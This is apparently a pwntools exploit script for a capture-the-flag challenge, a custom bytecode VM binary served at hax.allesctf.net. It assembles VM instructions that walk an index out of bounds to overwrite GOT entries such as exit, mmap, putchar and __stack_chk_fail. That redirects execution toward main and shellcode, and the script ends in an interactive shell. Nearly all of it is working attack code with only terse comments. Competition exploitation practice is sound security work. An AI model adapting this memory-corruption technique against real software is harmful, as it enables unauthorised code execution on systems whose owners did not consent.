from pwn import *
g_local=1
context(log_level='debug', arch='amd64')
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
p = ELF("./vm")
if g_local:
	sh = process("./vm", env={"LD_PRELOAD":"./buffer_read.so"})
	gdb.attach(sh)
else:
	sh = remote("hax.allesctf.net", 3301)

payload = p32(1)

res = []
def ins(opcode):
	global res
	res += [1] * opcode + [0]
def assemble(bits):
	pos = 7
	val = 0
	ret = []
	for b in bits:
		val |= b << pos
		if pos == 0:
			ret.append(val)
			pos = 7
			val = 0
		else:
			pos -= 1
	ret.append(val)
	return ret


idx = -((p.got["exit"] - 0x405000) / 4 - 2)
ins(2) # idx = -1
for i in xrange(idx):
	ins(4) # data[1] = (p.got["exit"] - 0x405000) / 4 - 2
ins(9)

assert p.got["putchar"] < p.got["puts"]
assert p.got["puts"] < p.got["__stack_chk_fail"]
assert p.got["__stack_chk_fail"] < p.got["mmap"]
assert p.got["mmap"] < p.got["exit"]
def inc(val):
	for i in xrange(val):
		ins(3)
def dec(val):
	for i in xrange(val):
		ins(4)
def inc_idx(val):
	for i in xrange(val):
		ins(1)
def dec_idx(val):
	for i in xrange(val):
		ins(2)
inc(0x4010D4 - 0x401096) # exit lazy load -> retn, not needed actually..
dec_idx((p.got["exit"] - p.got["mmap"]) / 4)
dec(0x11B9D0 - 0x11B9Ba) # mmap -> retn
dec_idx((p.got["mmap"] - p.got["putchar"]) / 4)
inc(0x401502 - 0x401036) # putchar lazy load -> main 0x4014D8, 0x4014F4
ins(7)

# exit -> retn

# mmap -> mprotect
# stack_check_fail -> shellcode
# putchar -> main -> call mmap

# 0. call main, until [rbp-0x20]==0,
#	putchar -> call mmap
# 1. *idx = data[1]
# 2. putchar

res = assemble(res)
instr_num = (len(res) + 3 * 0xc) * 8
payload += p32(instr_num)
payload += ("".join(map(chr, res))).ljust(instr_num / 8, '\x00')

sh.recvuntil("push your payload to stdin..\n\n")

sh.send(payload)
print hex(idx)
payload = p32(1)
for i in xrange((0x809c0-0x4f2c5)/0xf00):
	res = []
	ins(3) # 7 + 3 = nop
	dec(1) # if (data[*idx + 2LL])
	ins(9) # load idx
	dec_idx((p.got["exit"] - p.got["puts"]) / 4)
	dec(0xf00)
	ins(7)
	res = assemble(res)
	instr_num = (0x405000-12) * 8
	payload += p32(instr_num)
	payload += ("".join(map(chr, res))).ljust(0x406000-0x405030, '\x00')
	sh.send(payload)
	sleep(1)
	sh.send('\x01')
	#sh.interactive()
	payload = '\x00' * 3

res = []
ins(3) # 7 + 3 = nop
dec(1) # if (data[*idx + 2LL])
ins(9) # load idx
dec_idx((p.got["exit"] - p.got["puts"]) / 4)
dec(0xafb-0x5d)
ins(7)
res = assemble(res)
instr_num = (0x405000-12) * 8
payload += p32(instr_num)
payload += ("".join(map(chr, res))).ljust(0x406000-0x405030, '\x00')
sh.send(payload)
sleep(1)
sh.send('\x01')
payload = '\x00' * 3

res = []
ins(3) # 7 + 3 = nop
dec(1) # if (data[*idx + 2LL])
ins(9) # load idx
dec_idx((p.got["exit"] - p.got["putchar"]) / 4)
dec(0x401502 - 0x4014D8)
ins(7)
res = assemble(res)
instr_num = (0x405000-12) * 8
payload += p32(instr_num)
payload += ("".join(map(chr, res))).ljust(0x406000-0x405030, '\x00')
sh.send(payload)
sleep(1)

sh.interactive()


